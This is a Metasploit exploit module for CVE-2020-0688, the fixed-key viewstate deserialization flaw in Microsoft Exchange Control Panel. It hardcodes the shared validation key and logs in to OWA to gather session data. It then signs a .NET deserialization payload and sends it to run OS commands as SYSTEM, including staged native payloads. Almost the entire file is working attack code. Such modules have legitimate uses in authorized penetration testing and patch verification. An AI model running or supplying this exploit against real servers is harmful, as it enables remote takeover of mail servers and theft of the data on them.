# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;bindata&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  # include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  DEFAULT_VIEWSTATE_GENERATOR = &#039;B97B4E27&#039;
  VALIDATION_KEY = "\xcb\x27\x21\xab\xda\xf8\xe9\xdc\x51\x6d\x62\x1d\x8b\x8b\xf1\x3a\x2c\x9e\x86\x89\xa2\x53\x03\xbf"

  def initialize(info = {})
    super(update_info(info,
        &#039;Name&#039;           => &#039;Exchange Control Panel Viewstate Deserialization&#039;,
        &#039;Description&#039;    => %q{
          This module exploits a .NET serialization vulnerability in the
          Exchange Control Panel (ECP) web page. The vulnerability is due to
          Microsoft Exchange Server not randomizing the keys on a
          per-installation basis resulting in them using the same validationKey
          and decryptionKey values. With knowledge of these, values an attacker
          can craft a special viewstate to cause an OS command to be executed
          by NT_AUTHORITY\SYSTEM using .NET deserialization.
        },
        &#039;Author&#039;         => &#039;Spencer McIntyre&#039;,
        &#039;License&#039;        => MSF_LICENSE,
        &#039;References&#039;     => [
            [&#039;CVE&#039;, &#039;2020-0688&#039;],
            [&#039;URL&#039;, &#039;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&#039;],
        ],
        &#039;Platform&#039;       => &#039;win&#039;,
        &#039;Targets&#039;        =>
          [
            [ &#039;Windows (x86)&#039;, { &#039;Arch&#039; => ARCH_X86 } ],
            [ &#039;Windows (x64)&#039;, { &#039;Arch&#039; => ARCH_X64 } ],
            [ &#039;Windows (cmd)&#039;, { &#039;Arch&#039; => ARCH_CMD, &#039;Space&#039; => 450 } ]
          ],
        &#039;DefaultOptions&#039; =>
          {
            &#039;SSL&#039; => true
          },
        &#039;DefaultTarget&#039;  => 1,
        &#039;DisclosureDate&#039; => &#039;2020-02-11&#039;,
        &#039;Notes&#039;          =>
          {
            &#039;Stability&#039;   => [ CRASH_SAFE, ],
            &#039;SideEffects&#039; => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, ],
            &#039;Reliability&#039; => [ REPEATABLE_SESSION, ],
          }
        ))

    register_options([
      Opt::RPORT(443),
      OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The base path to the web application&#039;, &#039;/&#039; ]),
      OptString.new(&#039;USERNAME&#039;,  [ true, &#039;Username to authenticate as&#039;, &#039;&#039; ]),
      OptString.new(&#039;PASSWORD&#039;,  [ true, &#039;The password to authenticate with&#039; ])
    ])

    register_advanced_options([
      OptFloat.new(&#039;CMDSTAGER::DELAY&#039;, [ true, &#039;Delay between command executions&#039;, 0.5 ]),
    ])
  end

  def check
    state = get_request_setup
    viewstate = state[:viewstate]
    return CheckCode::Unknown if viewstate.nil?

    viewstate = Rex::Text.decode_base64(viewstate)
    body = viewstate[0...-20]
    signature = viewstate[-20..-1]

    unless generate_viewstate_signature(state[:viewstate_generator], state[:session_id], body) == signature
      return CheckCode::Safe
    end

    # we&#039;ve validated the signature matches based on the data we have and thus
    # proven that we are capable of signing a viewstate ourselves
    CheckCode::Vulnerable
  end

  def generate_viewstate(generator, session_id, cmd)
    viewstate = ::Msf::Util::DotNetDeserialization.generate(cmd)
    signature = generate_viewstate_signature(generator, session_id, viewstate)
    Rex::Text.encode_base64(viewstate + signature)
  end

  def generate_viewstate_signature(generator, session_id, viewstate)
    mac_key_bytes  = Rex::Text.hex_to_raw(generator).unpack(&#039;I<&#039;).pack(&#039;I>&#039;)
    mac_key_bytes << Rex::Text.to_unicode(session_id)
    OpenSSL::HMAC.digest(OpenSSL::Digest.new(&#039;sha1&#039;), VALIDATION_KEY, viewstate + mac_key_bytes)
  end

  def exploit
    state = get_request_setup

    # the major limit is the max length of a GET request, the command will be
    # XML escaped and then base64 encoded which both increase the size
    if target.arch.first == ARCH_CMD
      execute_command(payload.encoded, opts={state: state})
    else
      cmd_target = targets.select { |target| target.arch.include? ARCH_CMD }.first
      execute_cmdstager({linemax: cmd_target.opts[&#039;Space&#039;], delay: datastore[&#039;CMDSTAGER::DELAY&#039;], state: state})
    end
  end

  def execute_command(cmd, opts)
    state = opts[:state]
    viewstate = generate_viewstate(state[:viewstate_generator], state[:session_id], cmd)
    5.times do |iteration|
      # this request *must* be a GET request, can&#039;t use POST to use a larger viewstate
      send_request_cgi({
        &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;ecp&#039;, &#039;default.aspx&#039;),
        &#039;cookie&#039;   => state[:cookies].join(&#039;&#039;),
        &#039;agent&#039;    => state[:user_agent],
        &#039;vars_get&#039; => {
          &#039;__VIEWSTATE&#039;          => viewstate,
          &#039;__VIEWSTATEGENERATOR&#039; => state[:viewstate_generator]
        }
      })
      break
    rescue Rex::ConnectionError, Errno::ECONNRESET => e
      vprint_warning(&#039;Encountered a connection error while sending the command, sleeping before retrying&#039;)
      sleep iteration
    end
  end

  def get_request_setup
    # need to use a newer default user-agent than what Metasploit currently provides
    # see: https://docs.microsoft.com/en-us/microsoft-edge/web-platform/user-agent-string
    user_agent = &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43&#039;
    res = send_request_cgi({
      &#039;uri&#039;           => normalize_uri(target_uri.path, &#039;owa&#039;, &#039;auth.owa&#039;),
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;agent&#039;         => user_agent,
      &#039;vars_post&#039;     => {
        &#039;password&#039;    => datastore[&#039;PASSWORD&#039;],
        &#039;flags&#039;       => &#039;4&#039;,
        &#039;destination&#039; => full_uri(normalize_uri(target_uri.path, &#039;owa&#039;)),
        &#039;username&#039;    => datastore[&#039;USERNAME&#039;]
      }
    })
    fail_with(Failure::Unreachable, &#039;The initial HTTP request to the server failed&#039;) if res.nil?
    cookies = [res.get_cookies]

    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;ecp&#039;, &#039;default.aspx&#039;),
      &#039;cookie&#039; => res.get_cookies,
      &#039;agent&#039;  => user_agent
    })
    fail_with(Failure::UnexpectedReply, &#039;Failed to get the __VIEWSTATEGENERATOR page&#039;) unless res && res.code == 200
    cookies << res.get_cookies

    viewstate_generator = res.body.scan(/id="__VIEWSTATEGENERATOR"\s+value="([a-fA-F0-9]{8})"/).flatten[0]
    if viewstate_generator.nil?
      print_warning("Failed to find the __VIEWSTATEGENERATOR, using the default value: #{DEFAULT_VIEWSTATE_GENERATOR}")
      viewstate_generator = DEFAULT_VIEWSTATE_GENERATOR
    else
      vprint_status("Recovered the __VIEWSTATEGENERATOR: #{viewstate_generator}")
    end

    viewstate = res.body.scan(/id="__VIEWSTATE"\s+value="([a-zA-Z0-9\+\/]+={0,2})"/).flatten[0]
    if viewstate.nil?
      vprint_warning(&#039;Failed to find the __VIEWSTATE value&#039;)
    end

    session_id = res.get_cookies.scan(/ASP\.NET_SessionId=([\w\-]+);/).flatten[0]
    if session_id.nil?
      fail_with(Failure::UnexpectedReply, &#039;Failed to get the ASP.NET_SessionId from the response cookies&#039;)
    end
    vprint_status("Recovered the ASP.NET_SessionID: #{session_id}")

    {user_agent: user_agent, cookies: cookies, viewstate: viewstate, viewstate_generator: viewstate_generator, session_id: session_id}
  end
end

